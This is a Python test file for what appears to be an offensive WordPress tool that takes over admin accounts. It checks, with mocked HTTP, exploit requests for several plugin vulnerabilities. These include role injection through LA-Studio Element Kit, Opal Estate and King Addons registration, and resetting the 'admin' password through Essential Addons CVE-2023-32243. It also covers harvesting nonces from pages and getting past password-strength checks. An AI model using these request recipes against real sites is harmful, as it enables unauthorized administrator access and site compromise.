import json
import re
from unittest.mock import MagicMock
from wp import recipes as wp_recipes
from wp import privesc as wp_privesc


def _recipe():
    return wp_recipes.find_privesc("lastudio-element-kit")[0]


def test_privesc_recipe_present():
    r = _recipe()
    assert r["cve"] == "CVE-2026-0920"
    assert r["role_param"] == "lakit_bkrole"
    assert r["role_value"] == "administrator"
    assert r["affected"] == "<=1.5.6.3"
    assert r["action"] == "lakit_ajax"
    assert r["envelope"] == {"subaction": "register", "id": "0"}


def test_acquire_admin_sends_role_injection_inside_actions_envelope():
    # LA-Studio's lakit_ajax dispatcher nests the real sub-action + its fields
    # as JSON under `actions`; the malicious lakit_bkrole rides inside that
    # nested `data`, not as a flat top-level POST field.
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200, text=
        'var LaStudioKitSettings = {"ajaxNonce":"ABCDEFNONCE","homeURL":"https://t/"};')
    http.post.return_value = MagicMock(status_code=200, text="ok")
    out = wp_privesc.acquire_admin("https://t/", http, _recipe(),
                                   creds={"username": "svc_x", "email": "x@y.z", "password": "pw123"})
    # returns the creds it tried to create
    assert out == {"username": "svc_x", "password": "pw123"}
    # posted to admin-ajax with the dispatcher action + nonce at the top level
    url, = http.post.call_args[0]
    assert url == "https://t/wp-admin/admin-ajax.php"
    data = http.post.call_args[1]["data"]
    assert data["action"] == "lakit_ajax"
    assert data["_nonce"] == "ABCDEFNONCE"
    inner = json.loads(data["actions"])["0"]
    assert inner["action"] == "register"
    assert inner["data"]["lakit_bkrole"] == "administrator"
    assert inner["data"]["username"] == "svc_x"
    assert inner["data"]["password-confirm"] == "pw123"
    assert inner["data"]["lakit_field_log"] == "yes"


def test_acquire_admin_random_creds_are_unique():
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200, text="")
    http.post.return_value = MagicMock(status_code=200)
    a = wp_privesc.acquire_admin("https://t", http, _recipe())
    b = wp_privesc.acquire_admin("https://t", http, _recipe())
    assert a["username"] != b["username"]
    assert a["password"] != b["password"]


def test_acquire_admin_swallows_transport_error():
    http = MagicMock(); http.post.side_effect = Exception("boom")
    assert wp_privesc.acquire_admin("https://t", http, _recipe()) is None


# ── generalized precursor kinds ───────────────────────────────────────────────
def test_kind_auth_bypass_returns_authed_session():
    http = MagicMock()
    r = {"kind": "auth-bypass", "endpoint": "/wp-admin/?loginas=1", "method": "GET",
         "params": {"uid": "1"}}
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out == {"authed": True}          # session now admin, no creds to return
    http.get.assert_called_once()
    assert http.get.call_args[0][0] == "https://t/wp-admin/?loginas=1"

def test_kind_password_reset_returns_target_and_new_pw():
    http = MagicMock()
    r = {"kind": "password-reset", "endpoint": "/wp-json/x/reset",
         "target_user": "admin", "user_param": "user", "pass_param": "np"}
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out["username"] == "admin" and len(out["password"]) > 8
    data = http.post.call_args[1]["data"]
    assert data["user"] == "admin" and data["np"] == out["password"]

def test_kind_options_update_sets_options_then_registers():
    http = MagicMock()
    r = {"kind": "options-update", "endpoint": "/wp-json/x/opt",
         "option_name_param": "key", "option_value_param": "val",
         "set_options": {"users_can_register": "1", "default_role": "administrator"}}
    out = wp_privesc.acquire_admin("https://t", http, r,
                                   creds={"username": "u1", "email": "u1@x.z", "password": "pw"})
    assert out == {"username": "u1", "password": "pw"}
    # two option writes + one registration = 3 POSTs
    assert http.post.call_count == 3
    writes = [c.kwargs["data"] for c in http.post.call_args_list[:2]]
    assert {"users_can_register", "default_role"} == {w["key"] for w in writes}

def test_unknown_kind_returns_none():
    assert wp_privesc.acquire_admin("https://t", MagicMock(), {"kind": "nope"}) is None


def test_harvest_rest_nonce_static_override_wins():
    assert wp_privesc._harvest_rest_nonce(
        "https://t", MagicMock(), {"nonce": "static9"}) == "static9"


def test_harvest_rest_nonce_absent_returns_empty():
    http = MagicMock(); http.get.return_value = MagicMock(status_code=200, text="<html></html>")
    assert wp_privesc._harvest_rest_nonce("https://t", http, {}) == ""


def test_harvest_rest_nonce_matches_unquoted_js_object_key():
    # Real-world example: Kirki's own hand-rolled JS (not wp_localize_script,
    # so no guaranteed JSON quoting) emits a bare/unquoted object key.
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='window.wp_kirki = {ajaxUrl: "https://t/wp-admin/admin-ajax.php", '
             'apiVersion: "v1", postId: "5", nonce: "00834e37cb", call_from: ""};')
    assert wp_privesc._harvest_rest_nonce("https://t", http, {}) == "00834e37cb"


def test_harvest_rest_nonce_does_not_match_substring_identifier():
    # "xnonce" contains "nonce" as a substring but isn't the key we want.
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='var x = {xnonce: "shouldnotmatch123"};')
    assert wp_privesc._harvest_rest_nonce("https://t", http, {}) == ""


# ── register-role with page-harvested nonce + extra fields (real PoCs need it) ─
def test_harvest_input_nonce_from_hidden_field():
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='<input type="hidden" name="opalestate-register-nonce" value="abc123def">')
    got = wp_privesc._harvest_input_nonce("https://t", http, "https://t/reg/",
                                          "opalestate-register-nonce")
    assert got == "abc123def"


def test_harvest_input_nonce_value_before_name():
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='<input value="zzz999" name="reg-nonce" />')
    assert wp_privesc._harvest_input_nonce("https://t", http, "https://t/r", "reg-nonce") == "zzz999"


def test_opal_estate_registry_recipe_wires_end_to_end():
    # Uses the REAL registry recipe (not a synthetic dict) to catch wiring bugs
    # between wp_recipes' field names and what _register_role expects.
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='<input type="hidden" name="opalestate-register-nonce" value="realnonce1">')
    http.post.return_value = MagicMock(status_code=200, text="ok")
    r = wp_recipes.find_privesc("opal-estate-pro")[0]
    out = wp_privesc.acquire_admin("https://t", http, r,
              creds={"username": "svc_o", "email": "o@x.z", "password": "pw98765432"})
    assert http.get.call_args[0][0] == "https://t/"
    data = http.post.call_args.kwargs["data"]
    assert data["action"] == "opalestate_register_form"
    assert data["username"] == "svc_o" and data["email"] == "o@x.z"
    assert data["password"] == "pw98765432" and data["password1"] == "pw98765432"
    assert data["role"] == "administrator"
    assert data["opalestate-register-nonce"] == "realnonce1"
    assert data["confirmed_register"] == "on"
    assert data["_wp_http_referer"] == "/" and data["ajax"] == "1"
    assert out == {"username": "svc_o", "password": "pw98765432"}


def test_register_role_harvests_nonce_and_sends_extra_and_confirm_fields():
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='<input name="opalestate-register-nonce" value="n0nc3v4l">')
    http.post.return_value = MagicMock(status_code=200, text="ok")
    r = {"kind": "register-role", "endpoint": "/wp-admin/admin-ajax.php",
         "action": "opalestate_register_form",
         "user_field": "username", "email_field": "email", "pass_field": "password",
         "pass_confirm_field": "password1",
         "role_param": "role", "role_value": "administrator",
         "nonce_from": {"url": "/register/", "field": "opalestate-register-nonce"},
         "extra_params": {"confirmed_register": "on", "_wp_http_referer": "/", "ajax": "1"}}
    out = wp_privesc.acquire_admin("https://t", http, r,
              creds={"username": "svc_a", "email": "a@b.c", "password": "pw12345678"})
    assert http.get.call_args[0][0] == "https://t/register/"     # harvested the page
    data = http.post.call_args.kwargs["data"]
    assert data["opalestate-register-nonce"] == "n0nc3v4l"
    assert data["password"] == "pw12345678" and data["password1"] == "pw12345678"
    assert data["role"] == "administrator" and data["action"] == "opalestate_register_form"
    assert data["confirmed_register"] == "on" and data["ajax"] == "1"
    assert out == {"username": "svc_a", "password": "pw12345678"}


def test_register_role_harvests_js_localized_nonce_with_object_scoping():
    # King Addons CVE-2025-6325: register_nonce is wp_localize_script'd inside
    # king_addons_login_register_vars, and the plugin ALSO localizes other
    # objects that use the literal key "nonce" for unrelated actions -- object
    # scoping is required to grab the right one.
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200, text=
        'var KingAddonsSearchData = {"nonce":"WRONGNONCE"};'
        'var king_addons_login_register_vars = {"ajax_url":"https://t/wp-admin/admin-ajax.php",'
        '"login_nonce":"loginnonceval","register_nonce":"RIGHTNONCE"};')
    http.post.return_value = MagicMock(status_code=200, text="ok")
    r = {"kind": "register-role", "endpoint": "/wp-admin/admin-ajax.php",
         "action": "king_addons_register_user",
         "user_field": "username", "email_field": "email", "pass_field": "password",
         "pass_confirm_field": "confirm_password",
         "role_param": "user_role", "role_value": "administrator",
         "nonce_from": {"url": "/", "key": "register_nonce",
                        "object": "king_addons_login_register_vars", "param": "nonce"}}
    out = wp_privesc.acquire_admin("https://t", http, r,
              creds={"username": "svc_k", "email": "k@b.c", "password": "pw12345678"})
    data = http.post.call_args.kwargs["data"]
    assert data["nonce"] == "RIGHTNONCE"
    assert data["user_role"] == "administrator"
    assert out == {"username": "svc_k", "password": "pw12345678"}


def test_register_role_falls_back_to_page_discovery_when_front_page_lacks_nonce():
    # King Addons renders register_nonce only on the page that shows the
    # Login|Register widget, so nonce_from.url "/" comes back empty. The code
    # must then discover the widget page via wp-json and harvest from there --
    # otherwise the registration is rejected with "Security check failed" and no
    # admin account is ever created (the live failure mode on cve-kingaddons).
    http = MagicMock()

    def _get(url, **kw):
        r = MagicMock(status_code=200)
        if "wp/v2/pages" in url:
            r.json.return_value = [{"id": 7, "link": "https://t/member-login/"}]
            r.text = ""
        elif url.rstrip("/").endswith("/member-login"):
            r.text = ('king_addons_login_register_vars = '
                      '{"login_nonce":"aaa","register_nonce":"DISCOVERED"};')
            r.json.return_value = {}
        else:  # front page "/" -- no widget, no nonce
            r.text = "<html>front</html>"
            r.json.return_value = {}
        return r

    http.get.side_effect = _get
    http.post.return_value = MagicMock(status_code=200, text="ok")
    r = {"kind": "register-role", "endpoint": "/wp-admin/admin-ajax.php",
         "action": "king_addons_user_register",
         "user_field": "username", "email_field": "email", "pass_field": "password",
         "pass_confirm_field": "confirm_password",
         "role_param": "user_role", "role_value": "administrator",
         "nonce_from": {"url": "/", "key": "register_nonce",
                        "object": "king_addons_login_register_vars", "param": "nonce"}}
    wp_privesc.acquire_admin("https://t", http, r,
        creds={"username": "svc_k", "email": "k@b.c", "password": "pw12345678"})
    data = http.post.call_args.kwargs["data"]
    assert data["nonce"] == "DISCOVERED"
    assert data["user_role"] == "administrator"


# ── password-reset with a page-harvested JS nonce + confirm field ─────────────
# Essential Addons CVE-2023-32243: reset_password() on `init` sets any user's
# password without validating rp_key, gated only by a nonce (action
# 'essential-addons-elementor') that is printed on the homepage as
# `var localize = {..."nonce":"..."}` and two matching password fields
# (eael-pass1 / eael-pass2). Both values source+live confirmed on cve-essaddons.
def test_password_reset_harvests_js_nonce_and_sends_confirm_field():
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='<script>var localize = {"ajaxurl":"/wp-admin/admin-ajax.php",'
             '"nonce":"a1b2c3d4e5","i18n":{}}</script>')
    http.post.return_value = MagicMock(status_code=200,
        text='{"success":true,"data":{"message":"Your password has been reset."}}')
    r = {"kind": "password-reset", "endpoint": "/wp-admin/admin-ajax.php",
         "target_user": "admin", "user_param": "rp_login",
         "pass_param": "eael-pass1", "pass_confirm_param": "eael-pass2",
         "params": {"action": "login_or_register_user",
                    "eael-resetpassword-submit": "1", "page_id": "124", "widget_id": "224"},
         "nonce_from": {"url": "/", "key": "nonce", "param": "eael-resetpassword-nonce"}}
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out["username"] == "admin" and len(out["password"]) > 8
    assert http.get.call_args[0][0] == "https://t/"          # harvested from homepage
    data = http.post.call_args.kwargs["data"]
    assert data["eael-resetpassword-nonce"] == "a1b2c3d4e5"
    assert data["eael-pass1"] == out["password"]
    assert data["eael-pass2"] == out["password"]             # confirm mirrors password
    assert data["rp_login"] == "admin"
    assert data["action"] == "login_or_register_user"
    assert data["eael-resetpassword-submit"] == "1"
    assert data["page_id"] == "124" and data["widget_id"] == "224"


def test_password_reset_without_nonce_from_does_not_fetch_a_page():
    # the original password-reset shape (no nonce harvest, no confirm) must not regress
    http = MagicMock()
    r = {"kind": "password-reset", "endpoint": "/wp-json/x/reset",
         "target_user": "admin", "user_param": "user", "pass_param": "np"}
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out["username"] == "admin"
    http.get.assert_not_called()          # no nonce_from → no page fetch
    data = http.post.call_args.kwargs["data"]
    assert data["user"] == "admin" and data["np"] == out["password"]
    assert "np" in data and out["password"] == data["np"]


def test_essential_addons_registry_recipe_wires_end_to_end():
    # Uses the REAL registry recipe to catch wiring bugs between wp_recipes'
    # field names and what _password_reset expects.
    http = MagicMock()
    http.get.return_value = MagicMock(status_code=200,
        text='var localize = {"ajaxurl":"x","nonce":"eanonce99","i18n":{}}')
    http.post.return_value = MagicMock(status_code=200,
        text='{"success":true,"data":{"message":"Your password has been reset."}}')
    r = wp_recipes.find_privesc("essential-addons-for-elementor-lite")[0]
    assert r["cve"] == "CVE-2023-32243"
    out = wp_privesc.acquire_admin("https://t", http, r)
    assert out["username"] == "admin" and len(out["password"]) > 8
    assert http.get.call_args[0][0] == "https://t/"
    data = http.post.call_args.kwargs["data"]
    assert data["action"] == "login_or_register_user"
    assert data["eael-resetpassword-submit"] == "1"
    assert data["eael-resetpassword-nonce"] == "eanonce99"
    assert data["eael-pass1"] == out["password"]
    assert data["eael-pass2"] == out["password"]
    assert data["rp_login"] == "admin"
    assert data["page_id"] == "124" and data["widget_id"] == "224"


def test_random_creds_password_satisfies_strength_gate():
    # Some registration handlers (e.g. King Addons CVE-2025-6325's
    # Security_Manager::validate_password_strength) reject a new account unless
    # the password is >=8 chars AND hits at least 3 of 4 character classes
    # (upper/lower/digit/special). A hex-only token clears length but only 2
    # classes, so the account is silently never created and the privesc "fails"
    # for a reason that has nothing to do with the vuln. Every generated
    # password must clear a 4-of-4 bar so it survives any such gate.
    upper = re.compile(r"[A-Z]")
    lower = re.compile(r"[a-z]")
    digit = re.compile(r"\d")
    special = re.compile(r"""[!@#$%^&*(),.?":{}|<>]""")
    for _ in range(200):
        pw = wp_privesc._random_creds()["password"]
        assert len(pw) >= 12, f"too short: {pw!r}"
        assert upper.search(pw), f"no uppercase: {pw!r}"
        assert lower.search(pw), f"no lowercase: {pw!r}"
        assert digit.search(pw), f"no digit: {pw!r}"
        assert special.search(pw), f"no special: {pw!r}"
